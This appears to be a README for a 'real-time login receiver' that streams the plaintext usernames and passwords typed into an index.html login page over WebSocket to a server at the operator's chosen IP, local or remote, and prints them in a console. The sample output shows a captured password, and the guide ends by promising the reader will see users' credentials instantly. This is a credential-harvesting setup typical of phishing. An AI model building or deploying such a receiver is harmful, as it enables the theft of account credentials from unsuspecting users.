# 🚀 Real-Time Login Receiver Setup

## What is WebSocket?
WebSocket provides real-time two-way communication between client and server. When a user logs in, credentials are sent instantly to your receiver server.

## 📋 Setup Steps:

### Step 1: Install WebSocket Package
```bash
cd c:\Users\A\Documents\html\database
npm install ws
```

### Step 2: Update Your IP Address in config.js
Edit `c:\Users\A\Documents\html\config.js`:

```javascript
const CONFIG = {
    DATABASE_API: 'http://localhost:3000',
    
    // WebSocket real-time communication
    WEBSOCKET_ENABLED: true,
    WEBSOCKET_URL: 'ws://YOUR_IP_ADDRESS:8080',  // Change this!
    
    // REST API fallback
    SEND_TO_IP_ENABLED: false,
    TARGET_IP: 'http://YOUR_IP_ADDRESS:8080'
};
```

**Examples:**
- Local: `'ws://localhost:8080'`
- Network: `'ws://192.168.130.148:8080'`
- Remote: `'ws://example.com:8080'`

### Step 3: Start the Real-Time Receiver Server
Open a new Command Prompt and run:
```bash
cd c:\Users\A\Documents\html\database
node receiver-server.js
```

You should see:
```
🚀 Real-time login receiver running on port 8080
📡 WebSocket: ws://localhost:8080
🌐 HTTP: http://localhost:8080

Waiting for login credentials...
```

### Step 4: Start Your Main Backend Server
Open another Command Prompt:
```bash
cd c:\Users\A\Documents\html\database
node server-online.js
```

### Step 5: Test It
1. Open `index.html` in browser
2. Enter username and password
3. Click "Log in"
4. Check the receiver server console - you'll see credentials in real-time!

## 📊 What You'll See in Receiver Console:

```
✅ New client connected

📨 Received login credentials:
Username: aiexpert1120
Password: mypassword123
Timestamp: 2024-01-15T10:30:00.000Z
---
```

## 🔄 How It Works:

1. **User logs in** → Credentials sent to database
2. **WebSocket connection** → Credentials sent in real-time to receiver
3. **Receiver displays** → Shows credentials instantly in console
4. **Multiple clients** → Can connect multiple receivers to same server

## 📡 Multiple Receivers

You can connect multiple receiver clients to the same server:

```bash
# Terminal 1: Receiver 1
node receiver-server.js

# Terminal 2: Receiver 2 (connects as client)
# Open browser and go to: http://localhost:8080
```

## 🛠️ Troubleshooting:

**"Cannot find module 'ws'"**
```bash
npm install ws
```

**"Port 8080 already in use"**
```bash
# Change port in receiver-server.js line 60:
const PORT = process.env.PORT || 9090;  // Use 9090 instead
```

**"WebSocket connection failed"**
- Check firewall settings
- Verify IP address in config.js
- Make sure receiver server is running

## 📝 Files Created:

- `receiver-server.js` - Real-time WebSocket server
- `js/websocket-client.js` - WebSocket client for frontend
- `config.js` - Configuration file (updated)
- `package.json` - Updated with ws package

## ✅ Complete Flow:

```
User Login (index.html)
    ↓
Save to Database (localhost:3000)
    ↓
Send via WebSocket (ws://YOUR_IP:8080)
    ↓
Receiver Server displays in real-time
```

Now when users log in, you'll see their credentials instantly! 🎉
